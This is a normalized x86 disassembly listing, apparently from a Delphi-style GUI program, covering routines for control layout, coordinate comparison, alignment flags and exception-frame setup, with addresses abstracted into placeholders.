push esi
mov ebx eax
mov esi [ ebx + 0x68 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_473910
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x68 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_473930
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x68 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_473950
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x68 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_473970
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x68 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_473990
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_43c684
mov eax ebx
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
mov eax ebx
call sub_4702b4
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x4c ]
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xfff0
call sub_40587c
sub_4739c8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_473a65
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_43139c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x5c ]
mov edx eax
mov edi esi
mov eax edi
call sub_48cb60
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_48cd4c
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_470e50
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_48c9f8
movzx edx [ ebx + 0x59 ]
mov eax edi
call sub_48ce6c
push [ ebx + 0x114 ]
push [ ebx + 0x110 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x38 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473a6c
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_473a74
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] eax
xor ebx ebx
mov ecx edx
test ecx ecx
jle r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov esi 0x1
mov edx [ ebp - 0x8 ]
add edx 0x8
inc esi
add edx 0x8
dec ecx
jne r-xdata
mov ebx esi
fld [ edx ]
mov eax [ ebp - 0x8 ]
fcomp [ eax + ebx * 8 ]
fwait
fnstsw ax
sahf
jae r-xdata
sub_473ab4
push ebx
push esi
push edi
push ebp
add esp 0xffffffc8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor ebx ebx
mov esi [ eax + 0x48 ]
mov edi [ eax + 0x4c ]
mov eax [ esp ]
test eax eax
jg r-xdata
cmp esi eax
jg r-xdata
mov bl 0x3
jmp r-xdata
mov edx [ esp + 0x4 ]
test edx edx
jg r-xdata
mov bl 0x4
jmp r-xdata
mov eax ebx
add esp 0x38
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi edx
jg r-xdata
mov bl 0x1
jmp r-xdata
mov ebp edx
sub edi edx
mov [ esp + 0x8 ] eax
sub esi eax
fild [ esp + 0x8 ]
fstp [ esp + 0xc ]
fwait
mov [ esp + 0x2c ] esi
fild [ esp + 0x2c ]
fstp [ esp + 0x14 ]
fwait
mov [ esp + 0x30 ] ebp
fild [ esp + 0x30 ]
fstp [ esp + 0x1c ]
fwait
mov [ esp + 0x34 ] edi
fild [ esp + 0x34 ]
fstp [ esp + 0x24 ]
fwait
lea eax [ esp + 0xc ]
mov edx 0x3
call sub_473a74
sub eax 0x1
jb r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x3
jmp r-xdata
je r-xdata
mov bl 0x4
jmp r-xdata
dec eax
je r-xdata
mov bl 0x1
jmp r-xdata
dec eax
je r-xdata
mov bl 0x2
jmp r-xdata
sub_473b64
push ebx
mov ebx eax
cmp [ ebx + 0x90 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x64 ]
mov edx eax
mov eax [ ebx + 0x90 ]
call sub_40580c
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_473b98
push ebx
test [ eax + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
mov edx [ eax + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x98 ]
sub_473bb8
push ebx
push esi
push edi
mov edi eax
mov ebx edx
mov eax edi
mov si 0xffc7
call sub_40587c
test al al
je r-xdata
mov eax edi
call sub_473bf8
or ebx eax
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
mov eax ebx
and eax 0x1
dec eax
je r-xdata
and ebx 0xfffffffd
jmp r-xdata
or ebx 0x2
sub_473c24
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov edi [ ebx + 0x68 ]
test edi edi
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi [ ebp + 0x8 ]
lea edx [ esi + 0x38 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x84 ]
test al al
jne r-xdata
mov [ ebp + 0xc ] 0x1
sub_473c54
push ebx
push esi
push edi
push ebp
add esp 0xffffffc8
mov ebp edx
mov edi eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
add esp 0x38
pop ebp
pop edi
pop esi
pop ebx
retn
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ esp + 0x12 ] eax
movsx eax [ esp + 0x12 ]
mov [ esp + 0x18 ] eax
movsx eax [ esp + 0x14 ]
mov [ esp + 0x1c ] eax
mov eax [ esp + 0x18 ]
mov [ esp ] eax
mov eax [ esp + 0x1c ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_42e200
test al al
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_470990
lea edx [ esp + 0x28 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x54 ]
lea eax [ esp + 0x28 ]
lea edx [ esp + 0x8 ]
call sub_40abd8
test al al
jne r-xdata
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
mov [ esp + 0x10 ] 0x0
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x8 ]
mov eax edi
mov si 0xffe8
call sub_40587c
movzx eax [ esp + 0x10 ]
mov [ ebp + 0xc ] eax
cmp [ esp + 0x10 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov eax edi
mov si 0xffd8
call sub_40587c
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebx + 0x69 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx edi
mov eax edi
call sub_4709bc
mov [ ebx + 0x6c ] edi
mov eax esp
call sub_42e200
test al al
je r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x44 ]
mov [ ebp + 0xc ] 0x1
xor eax eax
mov [ esp + 0x20 ] eax
xor eax eax
mov [ esp + 0x24 ] eax
mov ecx esp
lea edx [ esp + 0x20 ]
mov eax edi
call sub_47085c
sub_473d94
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ eax + 0x122 ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
push ecx
mov ebx eax
mov edx eax
lea ecx [ esp + 0x4 ]
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
sub_473dd4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_473ed4
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jne r-xdata
test esi esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x34 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
mov [ ebx ] edx
mov edx [ eax + 0x4 ]
mov [ ebx + 0x4 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
add [ ebx ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
add [ ebx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x11
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160e8
call sub_4060b0
test eax eax
je r-xdata
test eax eax
jne r-xdata
cmp esi eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473edb
lea eax [ ebp - 0x18 ]
mov edx 0x2
call j_sub_4068c4
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x11
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160e8
call sub_4060b0
cmp [ eax + 0x34 ] 0x0
je r-xdata
mov eax [ eax + 0x34 ]
mov edx [ eax + 0x40 ]
add [ ebx ] edx
mov edx [ eax + 0x44 ]
add [ ebx + 0x4 ] edx
sub_473ee4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_473fe4
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jne r-xdata
test esi esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x34 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
mov [ ebx ] edx
mov edx [ eax + 0x4 ]
mov [ ebx + 0x4 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
sub [ ebx ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
sub [ ebx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x11
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160e8
call sub_4060b0
test eax eax
je r-xdata
test eax eax
jne r-xdata
cmp esi eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473feb
lea eax [ ebp - 0x18 ]
mov edx 0x2
call j_sub_4068c4
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x11
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160e8
call sub_4060b0
cmp [ eax + 0x34 ] 0x0
je r-xdata
mov eax [ eax + 0x34 ]
mov edx [ eax + 0x40 ]
sub [ ebx ] edx
mov edx [ eax + 0x44 ]
sub [ ebx + 0x4 ] edx
sub_473ff4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_471978
cmp [ esi + 0xc ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_474044
push esi
mov esi eax
test [ esi + 0x52 ] 0x10
setne al
cmp dl al
je r-xdata
pop esi
retn
test dl dl
je r-xdata
and [ esi + 0x50 ] 0xffefffff
or [ esi + 0x50 ] 0x100000
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x68 ]
sub_474070
test [ eax + 0x55 ] 0x40
jne r-xdata
retn
test [ eax + 0x1c ] 0x2
jne r-xdata
mov edx [ eax + 0x40 ]
mov [ eax + 0x194 ] edx
mov edx [ eax + 0x44 ]
mov [ eax + 0x198 ] edx
mov edx [ eax + 0x48 ]
mov [ eax + 0x19c ] edx
mov edx [ eax + 0x4c ]
mov [ eax + 0x1a0 ] edx
sub_474144
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_46f660
mov eax esi
mov edx [ r-xdata ]
call sub_405830
mov [ ebx + 0x20 ] eax
pop esi
pop ebx
retn
sub_474178
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_4742a9
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_46fac0
push ebx
push sub_4765c0
call sub_43ddc0
mov [ ebx + 0x25c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_44cb58
mov esi eax
mov [ ebx + 0x1c0 ] esi
mov edx [ ebx + 0x6c ]
mov eax esi
call sub_44cd1c
mov [ ebx + 0x260 ] 0x0
mov [ ebx + 0x1ee ] 0x1
mov [ ebx + 0x1ed ] 0x1
mov [ ebx + 0x1e4 ] 0xffffffff
mov [ ebx + 0x1cc ] 0x3
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x11
jne r-xdata
add esp 0xfffffff0
call sub_405b0c
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_49da3c
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x1d0 ]
call sub_4070a8
lea eax [ ebx + 0x1d0 ]
xor edx edx
call sub_4070a8
jmp r-xdata
mov [ ebx + 0x1eb ] 0x0
movzx eax [ r-xdata ]
mov [ ebx + 0x1ae ] al
mov [ ebx + 0x1af ] 0x2
mov [ ebx + 0x1b0 ] 0x1
mov [ ebx + 0x1b4 ] 0x1
mov [ ebx + 0x160 ] 0x1
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4802c4
mov esi eax
mov [ ebx + 0x1bc ] esi
mov [ esi + 0x1c ] ebx
mov [ esi + 0x18 ] sub_47ba28
mov [ ebx + 0x1ef ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4742b0
lea eax [ ebp - 0x8 ]
call j_sub_4068a0
retn
sub_4742b0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_4742d1
add [ eax ] al
add [ esi - 0x7d ] ah
mov eax 0x1ac
add [ edi ] cl
xchg edi eax
rol bl 0x55
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
mov [ ebx + 0x1d4 ] ecx
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x2c ]
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_474328
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call [ eax - 0xc ]
mov ebx eax
mov [ ebx + 0x1d4 ] esi
xor ecx ecx
or edx 0xffffffff
mov eax ebx
mov esi [ eax ]
call [ esi + 0x2c ]
mov eax ebx
pop esi
pop ebx
retn
sub_47434c
push ebx
push esi
push edi
push ecx
call sub_405bb4
mov [ esp ] dl
mov esi eax
mov eax esi
call sub_43c47c
cmp [ esi + 0x1ec ] 0x0
je r-xdata
lea eax [ esi + 0x1c8 ]
call sub_409cb4
lea eax [ esi + 0x1c4 ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4055f0
mov eax [ esi + 0xac ]
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov [ esi + 0x1ec ] 0x0
xor edx edx
mov eax esi
call sub_46e514
cmp [ esi + 0x34 ] 0x0
je r-xdata
call sub_4055f0
cmp [ esi + 0x258 ] 0x0
je r-xdata
mov dl 0x1
mov eax esi
call sub_4755d4
mov eax esi
call sub_475884
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
lea eax [ esi + 0x1c0 ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4055f0
mov eax [ esi + 0x25c ]
test eax eax
je r-xdata
mov edx ebx
dec edx
mov eax esi
call sub_475848
mov edi eax
mov edx edi
mov eax esi
call sub_475640
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov eax esi
call sub_475884
mov ebx eax
test ebx ebx
jne r-xdata
lea eax [ esi + 0x1bc ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4055f0
movzx edx [ esp ]
and dl 0xfc
mov eax esi
call sub_46fc08
cmp [ esp ] 0x0
jle r-xdata
call sub_43de58
pop edx
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_405b5c
sub_47445c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1e0 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push sub_474520
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1e0 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_430880
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4055f0
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp edx [ ebp - 0x8 ]
jge r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
call sub_479f1c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1e0 ]
mov edx esi
call sub_4305a0
mov edx [ eax + 0x1e4 ]
test edx edx
jl r-xdata
mov ecx eax
mov eax [ ebp - 0xc ]
call sub_43074c
mov edx esi
mov eax [ ebp - 0xc ]
call sub_4305a0
test eax eax
je r-xdata
sub_474530
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_475374
xor eax eax
push ebp
push sub_474570
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_46ffdc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474577
mov eax [ ebp - 0x4 ]
call sub_47537c
retn
sub_474577
mov eax [ ebp - 0x4 ]
call sub_47445c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x34 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4763e8
pop ebx
pop ecx
pop ebp
retn
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax [ ebp - 0x4 ]
call sub_472314
sub_4745a8
mov ecx [ eax + 0x1bc ]
mov ecx [ ecx + 0x8 ]
add [ edx ] ecx
mov ecx [ eax + 0x1bc ]
mov ecx [ ecx + 0xc ]
add [ edx + 0x4 ] ecx
mov ecx [ eax + 0x1bc ]
mov ecx [ ecx + 0x10 ]
sub [ edx + 0x8 ] ecx
mov eax [ eax + 0x1bc ]
mov eax [ eax + 0x14 ]
sub [ edx + 0xc ] eax
retn
sub_4745d8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
lea edi [ ebp - 0x28 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov edi eax
mov esi [ ebp + 0xc ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
cmp [ ebx + 0x18c ] 0x0
je r-xdata
movzx eax [ ebp + 0x14 ]
movzx eax [ eax + rw-data ]
cmp al [ ebx + 0x63 ]
je r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov eax [ esi + 0x8 ]
sub eax [ esi ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor edx edx
mov eax [ ebx + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0xc ] eax
mov edx 0x1
mov eax [ ebx + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x10 ] eax
mov edx 0x2
mov eax [ ebx + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x14 ] eax
mov edx 0x3
mov eax [ ebx + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x18 ] eax
test [ ebx + 0x63 ] 0x4
je r-xdata
mov edx 0x2
mov eax [ ebx + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x14 ] eax
movzx eax [ ebp + 0x14 ]
add al 0xfd
sub al 0x2
jb r-xdata
test [ ebx + 0x63 ] 0x1
jne r-xdata
test [ ebx + 0x63 ] 0x1
je r-xdata
mov edx 0x3
mov eax [ ebx + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x18 ] eax
movzx eax [ ebp + 0x14 ]
dec eax
sub al 0x2
jb r-xdata
sub al 0x1
jne r-xdata
test [ ebx + 0x63 ] 0x8
je r-xdata
mov eax [ ebx + 0x18c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebx + 0x17c ]
push eax
call MulDiv
mov edx [ ebp - 0x14 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ ebx + 0x18c ]
sub edx [ ebx + 0x17c ]
sub eax edx
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ ebx + 0x18c ]
sub edx [ ebx + 0x17c ]
sub eax edx
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0x1
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebx + 0x74 ]
call sub_4803dc
mov edx 0x2
mov eax [ ebx + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
jmp [ eax * 4 + jump_table_474853 ]
sub al 0x3
jne r-xdata
mov eax [ esi + 0xc ]
sub eax [ esi + 0x4 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
jl r-xdata
test [ ebx + 0x63 ] 0x2
jne r-xdata
test [ ebx + 0x63 ] 0x2
je r-xdata
sub eax edx
mov [ ebp - 0xc ] eax
adc edx 0x0
movzx eax [ ebp + 0x14 ]
cmp eax 0x5
ja r-xdata
mov edx 0x3
mov eax [ ebx + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
mov eax [ ebp - 0x18 ]
add [ esi + 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x18 ]
sub [ esi + 0xc ] eax
mov eax [ esi + 0xc ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
add [ esi ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
sub [ esi + 0x8 ] eax
mov eax [ esi + 0x8 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push esi
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0xbc ]
mov eax [ esi ]
mov [ ebp - 0xc ] eax
mov eax [ esi + 0x4 ]
mov [ ebp - 0x10 ] eax
movzx eax [ ebp + 0x14 ]
cmp eax 0x6
ja r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebx + 0x190 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call MulDiv
mov edx [ ebp - 0x18 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebx + 0x190 ]
sub edx [ ebx + 0x180 ]
sub eax edx
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebx + 0x190 ]
sub edx [ ebx + 0x180 ]
sub eax edx
mov [ ebp - 0x18 ] eax
jmp r-xdata
jmp [ eax * 4 + jump_table_47491a ]
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0x1
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebx + 0x74 ]
call sub_4803dc
movzx eax [ r-xdata ]
and al [ ebx + 0x63 ]
movzx edx [ r-xdata ]
cmp dl al
je r-xdata
sub eax edx
mov [ ebp - 0x10 ] eax
adc edx 0x0
mov edx 0x3
mov eax [ ebx + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x18 ]
sub edx eax
sub [ esi + 0x4 ] edx
jmp r-xdata
mov edx 0x3
mov eax [ ebx + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x18 ]
sub edx eax
add [ esi + 0xc ] edx
jmp r-xdata
mov edx 0x2
mov eax [ ebx + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x14 ]
sub edx eax
sub [ esi ] edx
jmp r-xdata
mov edx 0x2
mov eax [ ebx + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x14 ]
sub edx eax
add [ esi + 0x8 ] edx
jmp r-xdata
mov edx 0x2
mov eax [ ebx + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x14 ]
sub edx eax
add [ esi + 0x8 ] edx
mov edx 0x3
mov eax [ ebx + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x18 ]
sub edx eax
add [ esi + 0xc ] edx
movzx eax [ r-xdata ]
and al [ ebx + 0x63 ]
movzx edx [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ ebx + 0x18c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebx + 0x184 ]
push eax
call MulDiv
mov edx [ ebp - 0x14 ]
sar edx 0x1
